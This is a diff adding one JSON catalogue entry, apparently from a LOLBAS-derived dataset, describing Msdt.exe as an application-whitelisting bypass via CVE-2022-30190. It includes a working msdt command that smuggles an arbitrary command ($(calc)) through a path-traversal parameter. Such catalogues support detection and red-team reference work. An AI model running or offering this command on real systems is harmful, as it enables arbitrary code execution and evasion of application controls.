@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-msdt-exe-awl-bypass-2",
+  "name": "LOLBAS · Msdt.exe (AWL Bypass) #2",
+  "command": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"",
+  "description": "Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "msdt",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Msdt/",
+  "upstream_id": "Msdt.exe/AWL Bypass/1",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Msdt.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Msdt/"
+    }
+  ]
+}
